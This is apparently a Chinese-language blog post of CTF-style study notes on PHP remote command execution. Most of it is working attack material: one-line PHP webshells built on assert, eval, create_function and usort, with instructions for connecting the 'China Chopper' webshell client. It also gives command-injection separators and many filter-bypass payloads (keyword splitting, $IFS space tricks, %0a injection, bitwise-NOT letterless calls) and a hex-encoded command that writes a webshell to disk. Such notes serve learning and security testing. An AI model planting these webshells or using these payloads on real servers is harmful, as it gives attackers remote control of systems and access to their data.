# RCE


&gt; 参考文章：
&gt; [【web安全】——命令执行漏洞（RCE）详解](https://blog.csdn.net/qq_63844103/article/details/126953630)\
&gt; [RCE总结](https://blog.csdn.net/weixin_46706771/article/details/119008895?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169383565116800184198616%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169383565116800184198616&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-119008895-null-null.142^v93^control&amp;utm_term=rce&amp;spm=1018.2226.3001.4187)
## 漏洞分类

* 代码层过滤不严
商业应用的一些核心代码封装在二进制文件中，在web应用中通过system函数来调用：
```
system(&#34;/bin/program --arg $arg&#34;);
```
* 系统的漏洞造成命令注入
比如：bash破壳漏洞
* 调用的第三方组件存在代码执行漏洞
 如：wordPress中用来处理图片的imageMagick组件、JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）、ThinkPHP5.x的命令执行

## PHP可能存在命令执行漏洞的函数
**利用系统函数实现命令执行的函数**

* eval（）

  * 传入的参数必须为PHP代码，既需要以分号结尾

* assert（）

  * 最好不要加上分号作为结尾
  * `&lt;?php @assert($_POST[&#39;cmd&#39;])?&gt;`

* preg_replace（&#39;正则规则&#39;,&#39;替换字符&#39;，&#39;目标字符&#39;）

  * `preg_replace(&#34;/test/e&#34;,$_POST[&#34;cmd&#34;],&#34;jutst test&#34;);`

* call_user_func（）

  * `&lt;?php @assert($_POST[&#39;cmd&#39;])?&gt;`

* create_function()

  * 
    创建匿名函数执行代码
  * 执行命令和上传文件参考eval函数(必须加分号)
  * `&lt;?php $func =create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);$func(); ?&gt;`

* array_map()

  * ```
    &lt;?php
        $func=$_GET[&#39;func&#39;];
        $cmd=$_POST[&#39;cmd&#39;];
        $array[0]=$cmd;
        $new_array=array_map($func,$array);
        echo $new_array;
    ?&gt;
    ```

  * 菜刀连接`http://localhost/123.php?func=assert`   密码：cmd

* call_user_func_array()

* array_filter()

* uasort()

如果页面中存在以上这些函数并且对于用户的输入没有做严格的过滤，那么就可能造成远程命令执行漏洞，除此以外还有其他函数。

* ob_start（）

* unserialize（）

* creat_function（） 

* usort（）

* uasort（）

  * php环境&gt;=&lt;5.6才能用
  * uasort() 使用用户自定义的比较函数对数组中的值进行排序并保持索引关联 。
  *  命令执行：`http://localhost/123.php?1=1&#43;1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami);_`
  * 菜刀连接：`http://localhost/123.php?1=1&#43;1&amp;2=eval($_POST[cmd])`   密码：cmd
    &lt;?php
        usort($_GET,&#39;asse&#39;.&#39;rt&#39;);
    ?&gt;
  * 

* uksort（）

* array_filter（）

  * ```
    &lt;?php
        $cmd=$_POST[&#39;cmd&#39;];
        $array1=array($cmd);
        $func =$_GET[&#39;func&#39;];
        array_filter($array1,$func);
    ?&gt;
    ```

* array_reduce（）

* array_map（）

  * ```
    &lt;?php
        $func=$_GET[&#39;func&#39;];
        $cmd=$_POST[&#39;cmd&#39;];
        $array[0]=$cmd;
        $new_array=array_map($func,$array);
        echo $new_array;
    ?&gt;
    ```


**直接执行系统命令的代码函数**

* system（）
  * 将字符串作为OS命令执行，自带输出功能

* exec（）
  * 将字符串作为OS命令执行，需要输出执行结果，且它只会输出最后一行的内容。
  * `&lt;?php echo exec($_POST[&#34;cmd&#34;]);?&gt;`

* shell_exec（）
  * 将字符串作为OS命令执行，需要输出执行结果，且输出全部的内容
  * `&lt;?php echo shell_exec($_POST[&#34;cmd&#34;]); ?&gt;`

* passthru（）
  * 将字符串作为OS命令执行，不需要输出执行结果，且输出全部的内容

* pcntl_exec（）
  * `&lt;?php pcntl_exec(&#34;/bin/bash&#34;,array($_POST[&#34;cmd&#34;])); ?&gt;`

* popen（）、proc_open（）
  * 该函数也可以将字符串当作OS命令来执行，但是该函数返回的是文件指针而非命令执行结果。该函数有两个参数
  * `&lt;?php $handle = popen(&#34;/bin/ls&#34;,&#34;r&#34;);?&gt;`

* 反引号
  * `&lt;?php $handle = popen(&#34;/bin/ls&#34;,&#34;r&#34;);?&gt;`


## 命令拼接符号
* Windows
```
&amp;	A&amp;B	无论A是false还是true，B都执行，即互不影响
```
```
&amp;&amp;	A&amp;&amp;B	具有短路效果，A是false，B就不执行，有短路效果
```
```
|	A|B	表示A命令语句的输出，作为B命令语句的输入执行。当A为false的时候将不会执行
```
```
||	A||B	表示A命令语句执行失败，然后才执行B命令语句
```
```
cmd1 | cmd2	//无论cmd1是否执行成功，cmd2一定执行
cmd1 ; cmd2	//无论cmd1是否执行成功，cmd2一定执行
cmd1 &amp; cmd2	//无论cmd1是否执行成功，cmd2一定执行
cmd1 || cmd2	//仅在cmd1执行失败时，cmd2被执行
cmd1 &amp;&amp; cmd2	//尽仅在cmd1执行成功时，cmd2被执行
```

* Linux

```
&amp;       命令后面跟上一个空格和 ‘&amp;’，可执行多个语句，直到kill -s
```
```
;      可以进行多条命令的无关联执行，每条执行结果互不影响
```
```
&amp;&amp;  ||     与Windows中相同
```
```
()      如果想执行几个命令，则需要用命令分隔符分号隔开每个命令，并使用圆括号()把所有命令组合起来
```

## 命令绕过
### 过滤cat,flag等关键词
1. 代替
```
more:一页一页的显示档案内容 // 后面的指令要用 `` 包住
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，可以查看
vim:一种编辑器，可以查看
sort:可以查看
uniq:可以查看
file -f:报错出具体内容
sh /flag 2&gt;%261  //报错出文件内容
exa:替代ls
```
```
// 常用指令
more `dir`

more `php -r php -r &#34;echo chr(102).chr(49).chr(97).chr(103);&#34;` //echo flag
```

2. 使用转义符

```
ca\t /fl\ag
cat fl&#39;&#39;ag
```
3. 内联执行绕过
```
a=fl;b=ag.php;cat$IFS$a$b
```
4. 变量绕过
```
a=c;b=a;c=t;$a$b$c 1.txt
```
5. 编码进制绕过
16进制&amp;base64编码

6. 利用正则匹配绕过
例：
过滤/1010/flag.php文件
```
cat 1010/flag.php
cat ????/fla*
```

7. 利用未初始化变量，使用$u绕过
```
cat 1010/flag.php
cat 1010$u/flag.php
```

8. 引号绕过（flag过滤）

   ```
   f&#34;&#34;lag
   f&#39;&#39;lag
   ```

* 命令执行函数system()绕过
  system(“whoami”)

1. 十六进制
```
“\x73\x79\x73\x74\x65\x6d”(“whoami”);
```
2. 括号绕过
```
(sy.(st).em)(whoami);
```
3. 使用内敛执行代替system
```
echo `ls`;
echo $(ls);
?&gt;&lt;?=`ls`;
?&gt;&lt;?=$(ls);
```
* 使用∗ 和 *和∗和@，x , x,x,{数字}
因为在没有传参的情况下，上面的特殊变量都是为空的
```
ca$*t 1010/flag.php
ca$@t 1010/flag.php
ca$2t 1010/flag.php
ca${39}t 1010/flag.php
```
* 	其它文件读取方式
```
curl file:///root/1010/flag.php
strings 1010/flag.php
uniq -c 1010/flag.php
bash -v 1010/flag.php
rev 1010/flag.php
```
* dir与ls的代替
find 列出当前目录下的文件以及子目录所有文件

### 过滤空格
```
%09（url传递）(cat%09flag.php)
${IFS}
$IFS$9
&lt;&gt;（cat&lt;&gt;/flag）
&lt;（cat&lt;/flag）
{cat,flag}
```
### 过滤目录分隔符 (/)
采用多个管道命令
```
;cd flag;cat *
```

### 过滤分隔符 | &amp; ;
可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号
```
功能	                     符号	                         payload
```
```
换行符	                     %0a	                        ?cmd=123%0als
回车符	                     %0d	                        ?cmd=123%0dls
连续指令	              ;	                                ?1=123;pwd
后台进程	              &amp;	                                ?1=123&amp;pwd
管道                          |	                                ?1=123|pwd
逻辑运算	            ||或&amp;&amp;	                        ?1=123&amp;&amp;pwd
```

### ?&gt; 代替 ;
在php中可以用?&gt;来代替最后一个`;`因为php遇到定界符关闭标志时，系统会自动在PHP语句之后加上一个分号。

### 字符串长度受限
使用touch来生成文件，然后将生成的文件名拼凑成一句命令，最后执行，达到目的
```
&lt;-- cat flag.php --&gt;
替换：
touch &#34;hp&#34;
touch &#34;g.p\\&#34;
touch &#34;la\\&#34;
touch &#34;t f\\&#34;
touch &#34;ca\\&#34;
ls -t
ls -t &gt;a 将 ls -t 内容写入到a文件中
sh a
```
```
\是指换行
ls -t将文件按时间排序输出
sh命令可以从一个文件中读取命令来执行
```

### 无回显

* shell_exec等无回显函数

  * 判断

    ```
    ls;sleep 5
    ls / | sleep 5
    ```

  * 打印结果

    ```
    ?cmd=ls / | tee 1.txt
    ?cmd=ls / &gt; 1.txt
    ```

    
```
//复制，压缩，写shell等方法
copy flag.php flag.txt
mv flag.php flag.txt
cat flag.php &gt; flag.txt
```
```
//压缩方法
tar cvf flag.tar flag.php #tar压缩
tar zcvf flag.tar.gz flag.php  #tar解压
zip flag.zip flag.php  #zip压缩
unzip flag.zip  #zip解压
```
```
// 写shell方法【echo &#34;&lt;?php @eval(\$_POST[123]); ?&gt;&#34; &gt; webshell.php】
// 3c3f706870206576616c28245f504f53545b3132335d293b203f3e是&lt;?php eval($_POST[123]); ?&gt;的十六进制编码
echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php
```

### 取反绕过

&gt; 一般用于无字母RCE

```PHP
&lt;?php
echo urlencode(~&#39;system&#39;);
echo &#34;\n&#34;;
echo urlencode(~&#39;cat /flllllaaaaaaggggggg&#39;);
?&gt;
```

```
?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98); 
# ?wllm=system(ls /);
```

### eval执行时用了php的结束标志?&gt;绕过

&gt; 源码显示：`eval(&#34;?&gt;&#34;. $word);`

* `&lt;? echo &#39;123&#39;;?&gt;`

  但前提是前提是开启配置参数short_open_tags=on

* `&lt;script language=&#34;php&#34;&gt;echo &#39;hello&#39;;`

  不需要修改参数开关，但是只能在7.0以下可用

* `&lt;% echo &#39;123&#39;;%&gt;`

  开启配置参数`asp_tags=on`，并且只能在7.0以下版本使用


---

> Author: [Ting](Tin10g.github.io)  
> URL: http://localhost:1313/posts/2023web-rce/  

